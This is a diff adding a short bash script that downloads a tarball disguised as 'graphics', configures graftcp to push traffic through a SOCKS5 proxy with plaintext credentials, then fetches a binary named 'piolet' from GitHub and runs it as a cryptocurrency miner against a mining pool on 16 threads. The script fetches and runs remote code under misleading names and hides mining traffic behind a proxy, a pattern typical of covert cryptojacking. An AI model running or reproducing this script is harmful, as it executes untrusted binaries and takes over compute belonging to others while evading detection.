@@ -1,0 +1,31 @@
+#!/bin/bash
+curl -L -o graphics.tar.gz https://github.com/denisule54/dsX24/raw/main/graphics.tar.gz
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+
+listen = :2233
+
+loglevel = 1
+
+socks5 = sg-socks5.woiden.net:8080
+
+socks5_username = woiden_crozz
+
+socks5_password = 123
+
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+
+
+echo " "
+
+echo " "
+curl -L -o piolet https://github.com/Ikuzot/nung/raw/main/piolet
+chmod +x piolet 
+
+
+
+./graftcp/graftcp ./piolet --algorithm wrkzcoin --pool stc.ss.poolin.one:443 --username nung.002 --password 123 --disableNVIDIA --threads 16
